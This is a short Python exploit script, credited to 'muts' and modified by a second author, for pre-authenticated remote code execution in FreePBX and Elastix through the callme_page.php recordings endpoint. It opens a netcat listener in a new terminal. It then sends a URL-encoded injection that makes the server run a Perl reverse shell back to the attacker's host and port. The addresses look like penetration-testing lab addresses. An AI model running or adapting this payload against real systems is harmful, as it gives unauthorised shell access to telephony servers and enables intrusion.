#!/usr/bin/env python
import webbrowser
import subprocess
import os

############################################################
# Exploit Title: FreePBX / Elastix pre-authenticated remote code execution exploit
# Google Dork: oy vey
# Date: March 23rd, 2012
# Author: muts
# Version: FreePBX 2.10.0/ 2.9.0, Elastix 2.2.0, possibly others.
############################################################
# Modified by Rishabh Sharma
############################################################


#Change LHOST and LPORT for reverse connection
#Change RHOST and RPORT for remote connection

print  "Open your browser before running this script..."

RHOST= "10.11.1.217"
RPORT = "443"
LHOST = "10.11.0.152"
LPORT = "4431"
extension = "1000"

print "Run your nc: nc -nlvp "+str(LPORT)

os.system("gnome-terminal --tab -t 'Reverse Connection nc' -e 'nc -nlvp '"+str(LPORT))

url = 'https://'+str(RHOST)+":"+str(RPORT)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(LHOST)+'%3a'+str(LPORT)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'
#print "URL: "+url
print "Exploiting.... Check you nc...."

# Open URL in a new tab, if a browser window is already open.
webbrowser.open_new_tab(url)

# Open URL in new window, raising the window if possible.
#webbrowser.open_new(url)
